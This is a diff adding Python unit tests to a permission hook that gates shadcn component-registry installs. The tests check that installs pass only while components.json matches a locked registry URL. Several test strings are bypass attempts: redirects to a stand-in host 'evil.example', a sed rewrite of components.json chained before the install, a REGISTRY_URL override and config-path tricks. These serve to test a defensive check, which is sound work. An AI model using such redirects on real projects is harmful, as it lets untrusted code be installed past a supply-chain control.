@@ -489,6 +489,74 @@ class Hook(Base):
         rc, _ = quiet(ri.main, ["allow", str(self.root), "@ui-agent", ui_agent, "--reason", "ds", "--trust", "live"])
         self.assertEqual(rc, 0)
 
+    def live_ui_agent(self, url: str = "https://ui-agent.example/r/{name}.json") -> str:
+        project(self.root, ui="ui-sdk", registries={"@ui-agent": url})
+        meta = self.root / ".workflow/meta.json"
+        m = json.loads(meta.read_text())
+        m["stack"]["ui_registry"] = {"namespace": "@ui-agent", "url": url, "ui_sdk_version": "0.1.0-beta.17"}
+        meta.write_text(json.dumps(m))
+        quiet(ri.main, ["setup", str(self.root)])
+        return url
+
+    def test_a_live_namespace_passes_only_while_components_json_points_at_the_locked_url(self) -> None:
+        # Found by a security review on Agentic Factory, 2026-11-26: the live pass read the namespace
+        # from the command and the trust from the lock, but shadcn reads the URL from components.json,
+        # which nothing protects. Point @ui-agent elsewhere there and the install went through.
+        url = self.live_ui_agent()
+        self.assertIsNone(self.decide("npx shadcn add @ui-agent/button"))
+        write(self.root, "components.json", {"registries": {"@ui-agent": "https://evil.example/r/{name}.json"}})
+        self.assertIn("components.json", self.decide("npx shadcn add @ui-agent/button") or "")
+        write(self.root, "components.json", {"registries": {"@ui-agent": {"url": url, "headers": {"x": "y"}}}})
+        self.assertIsNone(self.decide("npx shadcn add @ui-agent/button"), "the object form with the same url is the same registry")
+        write(self.root, "components.json", {"registries": ["@ui-agent"]})
+        self.assertIsNotNone(self.decide("npx shadcn add @ui-agent/button"))
+        self.assertTrue(any("not an object" in f for f in ri.registry_problems(self.root, json.loads((self.root / ri.LOCK).read_text()))))
+        write(self.root, "components.json", {"registries": {}})
+        self.assertIsNotNone(self.decide("npx shadcn add @ui-agent/button"), "no entry: shadcn cannot resolve it from the lock")
+
+    def test_the_live_pass_reads_the_components_json_the_command_runs_in(self) -> None:
+        url = self.live_ui_agent()
+        write(self.root, "apps/web/components.json", {"registries": {"@ui-agent": url}})
+        write(self.root, "packages/ui/components.json", {"registries": {"@ui-agent": url}})
+        self.assertIsNone(self.decide("npx shadcn add @ui-agent/button", cwd=self.root / "apps/web"))
+        self.assertIsNone(self.decide("pnpm dlx shadcn@4.21.0 add @ui-agent/button --cwd apps/web"))
+        self.assertIsNone(self.decide("npx shadcn add @ui-agent/button --yes --overwrite --cwd apps/web"),
+                          "the ordinary options still pass")
+        write(self.root, "packages/ui/components.json", {"registries": {"@ui-agent": "https://evil.example/r/{name}.json"}})
+        self.assertIsNotNone(self.decide("npx shadcn add @ui-agent/button", cwd=self.root / "apps/web"),
+                             "a second components.json that disagrees with the lock is the same redirect")
+        found = ri.registry_problems(self.root, json.loads((self.root / ri.LOCK).read_text()))
+        self.assertTrue(any("packages/ui/components.json" in f for f in found),
+                        "check sees every file, not one per namespace")
+
+    def test_the_live_pass_is_for_the_install_alone(self) -> None:
+        # The file is read when the hook runs, before the command: anything run before the install in
+        # the same command could rewrite it after the check and before shadcn reads it.
+        self.live_ui_agent()
+        for c in ("sed -i '' s/ui-agent.example/evil.example/ components.json && npx shadcn add @ui-agent/button",
+                  "node rewrite.js; npx shadcn add @ui-agent/button",
+                  "cd apps/web && npx shadcn add @ui-agent/button",
+                  "REGISTRY_URL=https://evil.example npx shadcn add @ui-agent/button",
+                  "env X=1 npx shadcn add @ui-agent/button",
+                  "npx shadcn -c /tmp/elsewhere add @ui-agent/button",
+                  "npx shadcn add @ui-agent/button -c /tmp/elsewhere",
+                  "npx shadcn add @ui-agent/button -c=apps/web",
+                  "npx shadcn add @ui-agent/button --cwd ../",
+                  "npx shadcn add @ui-agent/button -c/tmp/elsewhere",
+                  "npx shadcn add @ui-agent/button -yc /tmp/elsewhere",
+                  "npx eve add @ui-agent/button"):
+            with self.subTest(c=c):
+                self.assertIsNotNone(self.decide(c))
+
+    def test_an_option_before_add_does_not_hide_the_install(self) -> None:
+        project(self.root)
+        quiet(ri.main, ["setup", str(self.root)])
+        for c in ("npx shadcn -c /tmp/elsewhere add @x/card", "npx shadcn --cwd apps/web add @x/card",
+                  "npx shadcn --cwd=/tmp/elsewhere add @x/card", "eve -C agent add @x/tool"):
+            with self.subTest(c=c):
+                self.assertIsNotNone(self.decide(c))
+        self.assertIsNone(self.decide("npx shadcn --version"), "an option with no install after it is not one")
+
     def test_ui_sdk_without_a_named_registry_has_nothing_live(self) -> None:
         project(self.root, ui="ui-sdk", registries={"@ui-agent": "https://ui-agent.example/r/{name}.json"})
         quiet(ri.main, ["setup", str(self.root)])
